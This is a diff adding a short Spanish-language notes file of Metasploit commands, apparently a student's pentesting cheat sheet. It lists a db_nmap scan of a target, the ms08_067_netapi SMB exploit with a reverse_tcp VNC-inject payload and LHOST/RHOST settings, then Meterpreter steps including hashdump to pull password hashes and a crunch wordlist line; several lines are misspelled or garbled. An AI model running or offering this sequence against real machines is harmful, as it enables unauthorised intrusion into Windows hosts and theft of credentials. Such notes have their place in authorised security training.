@@ -1,0 +1,55 @@
+Comandos
+
+ 
+
+Service openvas-manager start
+
+Top
+
+Service postgresql start
+
+Msfconsole
+
+Db_nmap  -sV  -A  -Pn  ip que  atacara
+
+ Hosts                     ver los host
+
+Service
+
+ Services –p 445    puesros bulnerables
+
+Search netapi        buscar paquetes
+
+ Use  exploit/Windows/smb/ms08_067_netapi         la vulnerabilidad
+
+Set payload Windows/vncinject/reverse_tcp
+
+Set LHOST        mi dirección  ip
+
+Set RHOST     la  ip  que  se atacar
+
+Show options       muestra       en el sitema
+
+Check
+
+ Exploit
+
+ 
+
+Meterpreter> cd Windows
+
+Meterpreter> pwd
+
+Meterpreter> cd system32  ,pwd
+
+Dir  mostra permiso
+
+Meterpreter> hashdump
+
+Ls
+
+Ps  lo que esta corriendo en el Windows
+
+ Nano nombre.txt   crear bun diretorio
+
+Crunch 1 1 –o dic.txt –p john 86  luna
